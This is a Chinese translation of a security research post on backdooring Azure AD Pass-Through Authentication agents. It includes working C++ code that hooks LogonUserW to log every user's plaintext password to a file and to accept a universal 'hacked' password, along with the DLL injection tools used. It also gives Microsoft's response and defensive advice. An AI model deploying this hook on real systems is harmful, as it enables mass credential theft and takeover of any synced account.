> 原文链接: https://www.anquanke.com//post/id/203941 


# Azure的万能钥匙：利用Pass-Through身份验证窃取用户凭证


                                阅读量   
                                **245910**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01b2b3dff2593679da.png)](https://p1.ssl.qhimg.com/t01b2b3dff2593679da.png)



注：安全研究员Adam Chester之前写过一篇文章[Azure AD Connect for Red Teamers](https://blog.xpnsec.com/azuread-connect-for-redteam/)，里面讲到如何劫持身份验证函数。

## 前言

如果攻击者攻破了企业的Azure代理服务器——同步Azure AD(Active Directory)与内部(on-premises) AD所需组件，他就可以在上面创建一个后门，用来在之后以任意已同步的用户身份进行登陆。本文编写了一个可以控制Azure身份验证功能的PoC，该PoC可以实现：1) 为我们提供一个所有用户可使用的“万能密码”；2) 将所有真实的纯文本用户名和密码转储到文件中。



## Azure AD-Connect中的Pass-Through验证方式

Azure AD-Connect将Azure AD环境和内部域连接到一起，并提供了几种身份验证方法：
<li>
**Password Hash Synchronization(密码哈希同步)**：一种将本地的内部哈希同步到云端的方法。</li>
<li>
**Pass-Through身份验证**：在内部安装一个“Azure代理”，用于验证云端的已同步用户身份。</li>
<li>
**Federation**：一种依赖于AD FS(Active Directory Federation Services)的验证方法。</li>
本文使用的攻击方法利用的是Pass-Through身份验证中的Azure代理，该内部代理为已经与内部域同步的账户收集并验证Azure AD接收到的身份凭据。



## 身份验证流程

[![](https://p3.ssl.qhimg.com/t010f8f5d650a314d35.png)](https://p3.ssl.qhimg.com/t010f8f5d650a314d35.png)
1. 用户在Azure AD/O365输入用户名和密码。
1. Azure AD使用公钥对该凭据进行加密，并将其放入代理队列（一个内部代理创建的持久连接）中。代理会收集该凭据，使用私钥进行解密。
1. 代理使用API函数****LogonUserW****向内部DC(Domain controller)验证该用户身份。
1. DC确认该凭据并返回响应。
1. 内部DC的响应被转发给Azure AD。
1. 如果用户登录行为验证通过，用户会登录机器。


## 代理滥用

为了能利用代理服务器，我们需要：
- 修改Azure AD Connect配置，让其使用Pass-Through的验证方式。
- 在一个安装了Azure代理的服务器上拥有管理员权限。
攻破了安装有Azure代理的服务器后，我们可以对验证流程进行修改。负责验证凭据的过程通常被称作****AzureADConnectAuthenticationAgentService.exe****，这个过程依赖API函数****LogonUserW****。微软的文档中提到，“身份验证代理会根据内部AD对用户名和密码进行验证，这个过程中使用了****dwLogonType****参数值为**LOGON32_LOGON_NETWORK**的[Win32 LogonUser API](https://msdn.microsoft.com/library/windows/desktop/aa378184.aspx)。

如果使用[APIMonitor](http://www.rohitab.com/apimonitor) (如果拥有管理员权限，该工具可以劫持任意Windows API调用)劫持该API的调用，我们可以在身份验证过程中发现一些很有意思的东西：

[![](https://p3.ssl.qhimg.com/t011e24793ac18e0b27.png)](https://p3.ssl.qhimg.com/t011e24793ac18e0b27.png)

使用密码“mypassword”对用户“noob”进行了验证。

[![](https://p0.ssl.qhimg.com/t01571a108a61afaf43.png)](https://p0.ssl.qhimg.com/t01571a108a61afaf43.png)



## 创建一个API监控器

现在我们已经知道如何访问密码了，那么能够自动化这个过程呢？

计划是在****AzureADConnectAuthenticationAgentService.exe****中注入DLL，把指向****LogonUserW****的指针改写为指向我们自己的函数。

我们使用[EasyHook](https://easyhook.github.io/)工具写了一个DLL，该文件会劫持****LogonUserW****函数，并替换成一个新的****LogonUserW****函数。

```
BOOL myLogonUserW(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, DWORD   dwLogonType, DWORD   dwLogonProvider, PHANDLE phToken)
`{`
  //Write to file
  ofstream myfile;
  myfile.open("c:\temp\shhhh.txt", std::ios_base::app);

  string user = utf8_encode(lpszUsername);
  string pass = utf8_encode(lpszPassword);    
myfile &lt;&lt; "Username: ";
  myfile &lt;&lt; user &lt;&lt; "n";
  myfile &lt;&lt; "Password: ";
  myfile &lt;&lt; pass &lt;&lt; "nn";
  myfile.close();

  return LogonUserW(lpszUsername, lpszDomain, lpszPassword, dwLogonType, dwLogonProvider, phToken);
`}`
```

这个新函数需要的变量个数与****LogonUserW****相同，该函数被调用时，会创建一个文件****“shhhh.txt”**** ，在里面写入用户名和密码。该函数的返回结果和真正的****LogonUserW****函数使用原始参数返回的结果相同。



## DLL注入

感谢[InjectAllTheThings](https://github.com/fdiskyou/injectAllTheThings)工具以及其中的反射DLL模块，我们把自己的DLL文件加载到了进程中并获得如下结果：

[![](https://p0.ssl.qhimg.com/t0117f7c317981e5092.png)](https://p0.ssl.qhimg.com/t0117f7c317981e5092.png)

所有连接到Azure AD的已同步用户（例如Office 365）的密码都会输出到我们的文本文件中。



## 锦上添花的收获

只需要在上面的密码收集器上再添加一些新技术，就可以将其转变为一个Azure万能密码，让攻击者使用预设的密码以任意用户身份进行单一登录。

为了实现该功能，我们需要修改**[**LogonUserW**](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw)**函数中的返回值，如果输入密码‘hacked’，无论用户的真实密码是什么，我们都可以成功登录。****LogonUserW****是一个布尔函数，它接受一个指向用户令牌的指针，使用用户令牌对该指针进行填充，如果成功，则返回true。

[![](https://p4.ssl.qhimg.com/t01a0970f9e0cf1c846.png)](https://p4.ssl.qhimg.com/t01a0970f9e0cf1c846.png)

经过测试后，我发现如果返回假的令牌或者不返回令牌都会导致进程崩溃，所以该程序需要一个有效的令牌。

那么我们可以从哪里获得一个用户令牌传递给该函数，而不需要生成令牌呢？

因为我们已经进入了****AzureADConnectAuthenticationAgentService.exe****进程，所以我们可以直接借用它的用户令牌。

新版本的DLL文件：

```
BOOL myLogonUserW(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, DWORD   dwLogonType, DWORD dwLogonProvider, PHANDLE phToken)
`{`
  //Write to file
  ofstream myfile;
  myfile.open("c:\temp\beep.txt", std::ios_base::app);

  string user = utf8_encode(lpszUsername);
  string pass = utf8_encode(lpszPassword);

  //get time
  std::time_t result = std::time(nullptr);
  myfile &lt;&lt; "[*] ";
  myfile &lt;&lt; std::asctime(std::localtime(&amp;result));

  myfile &lt;&lt; "Username: ";
  myfile &lt;&lt; user &lt;&lt; "n";
  myfile &lt;&lt; "Password: ";
  myfile &lt;&lt; pass &lt;&lt; "nn";
  myfile.close();

  string hacked = "hacked";

  if(hacked.compare(pass))
  `{`
    // Log the user in
    return LogonUserW(lpszUsername, lpszDomain, lpszPassword, dwLogonType, dwLogonProvider, phToken);
  `}`
  else
  `{`
    // Use Skeleton Key, return true
    OpenProcessToken(GetCurrentProcess(), TOKEN_READ, phToken);
    return true;
  `}`
`}`
```

通过调用****OpenProcessToken****函数，我们使用进程自己的令牌填充了****phToken****变量。

这个方法成功了！

尽管每个用户仍然可以使用自己的密码进行连接，但是我们可以使用密码’hacked’以任意用户身份通过身份验证。



## 演示视频

到目前为止，攻击者已经可以完全控制目标机器，并且可以以任意身份登录，包括全局的管理员身份。

演示视频可以[在此观看](https://blogvaronis2.wpengine.com/azure-skeleton-key/?wvideo=h4ryg2to1s)。



## 一些其他想法

在Azure代理上安装万能钥匙可用于：
- 提升权限到全局管理员，从而控制所有Azure用户
- 重置域管理员密码（假设启用了密码回写功能），从而访问企业的内部环境
- 保证持久性攻击
- 收集明文密码
微软的安全响应中心对我们的报告进行了回复，据此我们认为微软不会对这个问题进行修复：

> 该报告看起来并没有在微软产品或服务中发现任何会导致攻击者损害产品完整性、可用性及机密性的漏洞。利用报告中提出的问题，攻击者必须首先攻破目标计算机，然后才能接管其服务。

尽管我并不熟悉Azure Pass-Through身份验证的内部原理，但我还是可以在这里提出一个应对措施。比如说，由于DC受到了良好的保护，可以将加密的凭据从代理转发到驻留在DC中的集中式代理上。该代理会验证用户凭据，同时使用只有Azure云服务才能理解的加密响应进行回复。但是已经完全控制了DC的攻击者还是可以成功绕过该防御措施。

我们的一位客户对此十分感兴趣：

> 如果允许用户在不进行多因子身份验证(MFA)的情况下进行登录，那么万能钥匙确实是一个问题。但是更需要关心的是，代理可以在Azure使用本地DC进行身份验证时，以文本的格式抓取每个登录ID和密码。这会为攻击者提供大量有效的用户账号，攻击者可以以不同的身份登录访问内部资源，突然之间，原本无法访问数据库、其他设备或资源的服务器管理员就拥有了足够的账号，可以遍历整个环境并访问之前没有权限的数据库。当然，你可能会争辩说，获得了AD中的.dit文件也可以做到这一点，但是这样的话密码仍然是哈希值，你需要额外的时间破解这些哈希值，或者使用一种pass the hash攻击方法（大多数此类攻击都会被检测到）。这种新的方法对于攻击者来说使用起来更简单，而对于事件响应(IR)团队来说，又更加难以检测。



## 防御手段

特权攻击者可以使用该方法在目标计算机上安装后门或者收集密码。如果攻击者知道怎样掩盖自己的足迹，传统的日志分析很难检测到这些行为。

使用MFA可以防止攻击者使用虚假密码连接到Azure云上，但该方法还是可以在启用MFA的环境下收集密码。

进一步防御此攻击的方法是，保护Azure代理服务器的安全，监控用户活动中的异常资源与数据访问，使用分类的方法发现包含有明文用户名和密码的文件。



## 参考文献

微软文档：[how-to-connect-pta-security-deep-dive](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-pta-security-deep-dive)
